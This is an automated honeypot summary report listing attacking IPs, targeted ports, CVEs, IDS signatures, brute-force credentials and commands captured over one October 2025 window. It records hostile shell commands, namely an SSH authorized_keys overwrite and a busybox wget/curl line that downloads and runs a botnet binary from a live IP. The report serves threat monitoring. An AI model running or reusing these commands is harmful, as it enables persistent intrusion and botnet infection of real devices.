Honeypot Attack Summary Report

Report generated at: 2025-10-11T13:01:30Z
Timeframe: 2025-10-11T12:20:01Z to 2025-10-11T13:00:01Z

Files used to generate this report:
- agg_log_20251011T122001Z.json
- agg_log_20251011T124001Z.json
- agg_log_20251011T130001Z.json

Executive Summary
This report summarizes 13,302 malicious events recorded across the honeypot network. The majority of attacks were captured by the Cowrie honeypot. Attackers were observed performing system enumeration, attempting to download and execute malware, and leveraging a variety of CVEs. The most frequent attacks originated from IP addresses 223.100.22.69, 103.177.248.157, and 43.155.21.198.

Detailed Analysis

Attacks by honeypot:
- Cowrie
- Honeytrap
- Dionaea
- Ciscoasa
- Suricata
- Sentrypeer
- Redishoneypot
- ConPot
- Mailoney
- Ipphoney
- Tanner
- H0neytr4p
- ElasticPot
- Honeyaml
- Wordpot
- Dicompot
- Adbhoney
- Heralding

Top attacking IPs:
- 223.100.22.69
- 103.177.248.157
- 43.155.21.198
- 128.199.183.223
- 104.168.4.151
- 195.66.25.166
- 14.103.253.20
- 103.182.132.154
- 160.191.150.196
- 27.150.188.148

Top targeted ports/protocols:
- 445
- 22
- 1194
- TCP/5900
- 5903
- 5060
- 80
- 8333
- 6379

Most common CVEs:
- CVE-2021-3449
- CVE-2019-11500
- CVE-2022-27255
- CVE-2005-4050

Commands attempted by attackers:
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- tftp; wget; /bin/busybox YZNGS
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; ...

Signatures triggered:
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Reserved Internal IP Traffic
- ET DROP Spamhaus DROP Listed Traffic Inbound group 42
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source)
- ET HUNTING RDP Authentication Bypass Attempt

Users / login attempts:
- 345gs5662d34/345gs5662d34
- root/nPSpP4PBW0
- root/Ahgf3487@rtjhskl854hd47893@#a4nC
- test/test2013
- admin/password123
- debian/22222222
- root/LeitboGi0ro
- saidtaj/1955thomas
- newuser/newuser!
- root/fun3r@l
- sysadmin/password1
- guest/P@ssw0rd@123
- deployer/Password123!
- ali/Password1
- video/video
- vpn/vpn@

Files uploaded/downloaded:
- fonts.gstatic.com
- ie8.css
- html5.js
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

HTTP User-Agents:
- No user agents recorded in this timeframe.

SSH clients and servers:
- No specific SSH clients or servers recorded in this timeframe.

Top attacker AS organizations:
- No AS organizations recorded in this timeframe.

Key Observations and Anomalies
- A significant amount of activity was focused on system enumeration immediately after successful login, indicating automated reconnaissance scripts.
- The command `cd /data/local/tmp/; rm *; busybox wget ...` suggests an attempt to download and execute a malicious payload on an Android-based system.
- The presence of the string "mdrfckr" in an SSH authorized key indicates a likely taunt from the attacker.
- There's a mix of both simple brute-force attacks and more sophisticated attempts to exploit specific CVEs.
